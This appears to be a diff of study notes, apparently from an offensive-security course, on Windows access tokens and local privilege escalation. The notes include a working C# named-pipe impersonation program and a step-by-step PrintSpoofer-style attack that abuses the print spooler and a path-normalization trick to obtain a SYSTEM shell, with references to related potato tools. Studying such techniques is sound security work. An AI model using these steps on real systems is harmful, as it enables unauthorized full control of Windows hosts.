+
+Privileges are also included in the access token. They are a set of predefined operating system access rights that govern which actions a process can perform.
+
+View the available privileges for the current user
+
+```bat
+whoami /priv
+```
+
+The **SeShutdownPrivilege** privilege allows the user to reboot or shutdown the computer.
+
+It is possible to add additional privileges that will take effect after the targeted user account logs out and logs back in. Programmatically this can be done with the Win32 LsaAddAccountRights API, but more often it would be performed through a **group policy** or locally through an application like `secpol.msc`.
+
+SeLoadDriverPrivilege yields the permission to load a kernel driver. If we were to apply that privilege to our user, the current token would not be modified, rather a new token would be created once the user logs out and back in again.
+
+2 types of access tokens.
+
+Each process has a **primary access token** that originates from the user's token created during authentication.
+
+In addition, an **impersonation token** can be created that allows a user to act on behalf of another user without that user's credentials.
+
+Impersonation tokens have four levels: Anonymous, Identification, Impersonation, and Delegation.
+
+- Anonymous and Identification only allow enumeration of information.
+- Impersonation allows impersonation of the client's identity
+- Delegation makes it possible to perform sequential access control checks across multiple machines.
+
+The latter is critical to the functionality of distributed applications.
+
+E.g., a user authenticates to a web server and performs an action on that server that requires a database lookup. The web service could use delegation to pass authentication to the database server "through" the web server.
+
+### Elevation with Impersonation
+
+9 different privileges that may allow for privilege escalation from medium integrity to either high integrity or system integrity, or enable compromise of processes running as another authenticated user.
+
+**SeImpersonatePrivilege** allows us to impersonate any token for which we can get a reference, or handle.
+
+The built-in **Network Service** account, the **LocalService** account, and the **default IIS account** have it assigned by default.
+
+=> Gaining code execution on a **web server**
+
+When no tokens related to other user accounts are available in memory, we can likely force the **SYSTEM** account to give us a token that we can impersonate.
+
+Use a post exploitation attack that relies on Windows pipes.
+
+Pipes are a means of interprocess communication (IPC), just like RPC, COM, or even network sockets. A pipe is a section of shared memory inside the kernel that processes can use for communication.
+
+One process can create a pipe (the pipe server) while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.
+
+Anonymous pipes are typically used for communication between parent and child processes, while **named pipes** support impersonation.
+
+Force the SYSTEM account to connect to a named pipe set up by an attacker.
+
+While the technique was originally developed as part of an AD attack, it can also be used locally.
+
+It is based on the **print spooler service**, which is started by default and runs in a **SYSTEM** context.
+
+The print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes.
+
+If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.
+
+Create a C# application that creates a pipe server (i.e. a "print client"), waits for a connection, and attempts to impersonate the client that connects to it.
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+
+namespace PrintSpooferNet
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentThread();
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SID_AND_ATTRIBUTES
+        {
+            public IntPtr Sid;
+            public int Attributes;
+        }
+
+        public struct TOKEN_USER
+        {
+            public SID_AND_ATTRIBUTES User;
+        }
+
+        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
+                return;
+            }
+            string pipeName = args[0];
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+
+            ImpersonateNamedPipeClient(hPipe);
+
+            IntPtr hToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+
+            int TokenInfLength = 0;
+            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
+            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+            IntPtr pstr = IntPtr.Zero;
+            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+            string sidstr = Marshal.PtrToStringAuto(pstr);
+            Console.WriteLine(@"Found sid {0}", sidstr);
+        }
+    }
+}
+```
+
+Use the Win32 CreateNamedPipe, ConnectNamedPipe, and ImpersonateNamedPipeClient APIs.
+
+The **ImpersonateNamedPipeClient** API allows impersonation of the token from the account that connects to the pipe if the server has SeImpersonatePrivilege. When ImpersonateNamedPipeClient is called, the calling thread will use the impersonated token instead of its default token.
+
+CreateNamedPipe creates a pipe. This API accepts these arguments:
+
+1. The pipe name (lpName). All named pipes must have a standardized name format (such as \\.\pipe\pipename) and must be unique on the system.
+
+2. dwOpenMode describes the mode the pipe is opened in. Specify a bi-directional pipe with the PIPE_ACCESS_DUPLEX enum using its numerical equivalent of "3".
+
+3. dwPipeMode describes the mode the pipe operates in. Specify PIPE_TYPE_BYTE to directly write and read bytes along with PIPE_WAIT to enable blocking mode. => to listen on the pipe until it receives a connection. Specify the combination of these two modes with the numerical value "0".
+
+4. The maximum number of instances for the pipe is specified through nMaxInstances. This is primarily used to ensure efficiency in larger applications, and any value between 1 and 255 works.
+
+5. nOutBufferSize and nInBufferSize define the number of bytes to use for the input and output buffer. We'll choose one memory page (0x1000 bytes).
+
+6. The second-to-last argument defines the default time-out value that is used with the WaitNamedPipe API. Since we are using a blocking named pipe, we don't care about this and can choose the default value of 0.
+
+7. The last argument, we must submit a SID detailing which clients can interact with the pipe. We'll set this to NULL to allow the SYSTEM and local administrators to access it.
+
+**ConnectNamedPipe**'s argument:
+
+1. hNamedPipe is a handle to the pipe that is returned by CreateNamedPipe
+
+2. lpOverlapped is a pointer to a structure used in more advanced cases. Set this to NULL.
+
+After we have called ConnectNamedPipe, the application will wait for any incoming pipe client. Once a connection is made, call ImpersonateNamedPipeClient to impersonate the client.
+
+ImpersonateNamedPipeClient accepts the pipe handle as its only argument.
+
+At this point, our code will start a pipe server, listen for incoming connections, and impersonate them.
+
+If everything works correctly, ImpersonateNamedPipeClient will assign the impersonated token to the current thread.
+
+To verify the success of our attack, open the impersonated token with OpenThreadToken and then use GetTokenInformation to obtain the SID associated with the token. Finally, call ConvertSidToStringSid to convert the SID to a readable SID string.
+
+**OpenThreadToken**'s arguments:
+
+1. A handle to the thread (ThreadHandle) associated with this token. Since the thread in question is the current thread, use the Win32 GetCurrentThread API, which simply returns the handle.
+
+2. The level of access (DesiredAccess) we want to the token. To avoid any issues, we'll ask for all permissions (TOKEN_ALL_ACCESS) with its numerical value of 0xF01FF.
+
+3. OpenAsSelf specifies whether the API should use the security context of the process or the thread. Since we want to use the impersonated token, set this to false.
+
+4. A pointer (TokenHandle) will be populated with a handle to the token that is opened.
+
+**GetTokenInformation** API can return a variety of information, but we'll simply request the SID:
+
+1. TokenHandle is the token we obtained from OpenThreadToken
+
+2. TokenInformationClass specifies the type of information we want to obtain. Since we simply want the SID, we can pass TokenUser, which has the numerical value of "1", for the TOKEN_INFORMATION_CLASS argument.
+
+3. TokenInformation is a pointer to the output buffer that will be populated by the API
+
+4. TokenInformationLength is the size of the output buffer. Since we don't know the required size of the buffer, call this API twice. The first time, we set these two arguments values to NULL and 0 respectively and then ReturnLength will be populated with the required size. After this, we can allocate an appropriate buffer and call the API a second time. 
+
+To allocate the TokenInformation buffer, use the .NET Marshal.AllocHGlobal method, which can allocate unmanaged memory.
+
+Use ConvertSidToStringSid to convert the binary SID to a SID string that we can read.
+
+1. Sid is a pointer to the SID. The SID is in the output buffer that was populated by GetTokenInformation, but we must extract it first.
+One way to do this is to define the TOKEN_USER structure (which is part of the TOKEN_INFORMATION_CLASS used by GetTokenInformation) and then marshal a pointer to it with Marshal.PtrToStructure.
+
+2. For *StringSid, supply the output string. Supply an empty pointer and once it gets populated, marshal it to a C# string with Marshal.PtrToStringAuto.
+
+```bat
+psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
+```
+
+```bat
+whoami
+whoami /priv
+```
+
+Compile our assembled code, execute it and supply a random pipe name:
+
+```bat
+PrintSpooferNet.exe \\.\pipe\test
+```
+
+To simulate a connection, open an elevated command prompt and write to the pipe
+
+```bat
+echo hello > \\localhost\pipe\test
+```
+
+When we switch back to the command prompt running our application, we find that a SID has been printed.
+
+Our code has impersonated a token and resolved the associated SID.
+
+To verify that this SID belongs to the administrator account, we can switch back to the elevated command prompt and dump it
+
+```bat
+whoami /user
+```
+
+=> We can impersonate anyone who connects to our named pipe.
+
+The pipe name used by the print spooler service is `\pipe\spoolss`.
+
+Use the **SpoolSample** C# implementation or the PowerShell code (https://github.com/vletoux/SpoolerScanner).
+
+The SpoolSample application and the entire printer bug technique was developed to be used in an AD setting and was not specifically designed for local privilege escalation.
+
+When we use SpoolSample, specify the name of the server to connect to (the victim) and the name of the server we control (the attacker), also called the capture server.
+
+Since we are performing the attack locally, both servers are the same. This presents a challenge.
+
+The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print client (through our pipe) but since they are on the same host, they in effect require the same default pipe name (`pipe\spoolss`).`
+
+Before attempting to access the client pipe, the print spooler service validates the pipe path, making sure it matches the default name "`pipe\spoolss`". 
+
+Unfortunately, as mentioned before, we cannot specify "spoolss" as a name since it is already in use by the print spooler service we are targeting.
+
+What happens when a file path is supplied to a Win32 API?
+
+When directory separators are used as a part of the file path, they are converted to canonical form. Specifically, forward slashes ("/") will be converted to backward slashes ("\"). This is also known as **file path normalization**.
+
+If we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("appsrv01/test"), the spooler service will not interpret it correctly and it will append the default name "pipe\spoolss" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.
+
+This pipe name differs from the default one used by the print spooler service, and we can register it in order to simulate a print client.
+
+```bat
+SpoolSample.exe appsrv01 appsrv01/test
+```
+
+```
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
+```
+
+First, the path we supplied (appsrv01/test) has been switched to a canonical form (appsrv01\test) as part of the full path.
+Second, spoolsv.exe attempted to access the named pipe `\\.\appsrv01\test\pipe\spoolss` while performing the callback. Since we have not created a pipe server by that name yet, the request failed.
+
+At this point, we just need to create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.
+
+Open another command prompt and launch our PrintSpooferNet application. Recall that we are launching our application from a Network Service command prompt because we are demonstrating a scenario where we have exploited a process that has the SeImpersonatePrivilege, and we are trying to escalate to SYSTEM.
+
+```bat
+PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
+```
+
+```bat
+SpoolSample.exe appsrv01 appsrv01/pipe/test
+```
+
+Our application reveals a connection from the "S-1-5-18" SID.
+
+This SID value belongs to the SYSTEM account proving that our technique worked.
+
+We now have a way of forcing the SYSTEM account to authenticate to our named pipe, which allows us to impersonate it.
+
+To complete this attack, we must now take advantage of the impersonated token, which we will do by **launching a new command prompt as SYSTEM**.
+
+The Win32 **CreateProcessWithTokenW** API can create a new process based on a token. The token must be a primary token, so we'll first use **DuplicateTokenEx** to convert the impersonation token to a primary token.
+
+**DuplicateTokenEx**:
+
+- First, we'll supply the impersonation token by recovering it with OpenThreadToken. We'll request full access to the token with the numerical value 0xF01FF for the dwDesiredAccess argument. For the third argument (lpTokenAttributes), we'll use a default security descriptor for the new token by setting this to NULL.
+
+- ImpersonationLevel must be set to SecurityImpersonation, which is the access type we currently have to the token. This has a numerical value of "2". For the TokenType, we'll specify a primary token (TokenPrimary36) by setting this to "1".
+
+- The final argument (phNewToken) is a pointer that will be populated with the handle to the duplicated token.
+
+With the token duplicated as a primary token, we can call **CreateProcessWithToken** to create a command prompt as SYSTEM.
+
+First, we'll supply the newly duplicated token followed by a logon option, which we set to its default of 0. For the third (lpApplicationName) and fourth (lpCommandLine) arguments, we'll supply NULL and the full path of cmd.exe, respectively.
+
+The creation flags (dwCreationFlags), environment block (lpEnvironment), and current directory (lpCurrentDirectory) arguments can be set to 0, NULL, and NULL respectively to select the default options.
+
+For the two last arguments (lpStartupInfo and lpProcessInformation), we must pass STARTUPINFO37 and PROCESS_INFORMATION38 structures, which are populated by the API during execution.
+
+First launching our application to create the pipe server with the name "\\.\appsrv01\test\pipe\spoolss".
+
+Next, we'll launch SpoolSample with the capture server set to "\\appsrv01/pipe/test", which will force the SYSTEM account to connect to our named pipe and a new command prompt is opened.
+
+When we interact with it and display the user, we find it to be SYSTEM:
+
+```bat
+whoami /user
+```
+
+With this attack, we can elevate our privileges from an unprivileged account that has the SeImpersonatePrivilege to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10. Nice!
+A C++ implementation of this attack that has the SpoolSample functionality embedded is available by the researcher who discovered the technique. (https://github.com/itm4n/PrintSpoofer)
+
+Most native and third-party services that do not require administrative permissions run as Network Service or Local Service, partly due to Microsoft's recommendation. This attack technique means that compromising an unprivileged service is just as valuable as a SYSTEM service.
+
+The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and Yarden Shafir. (https://windows-internals.com/faxing-your-way-to-system/) It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for Network Service.
+
+On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the **RoguePotato** tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access. (https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+
+Lastly, the **beans** technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default. (https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)
+
+### Fun with Incognito
+
+## Kerberos and Domain Credentials
+
+## Processing Credentials Offline
 
 # Windows Lateral Movement
 
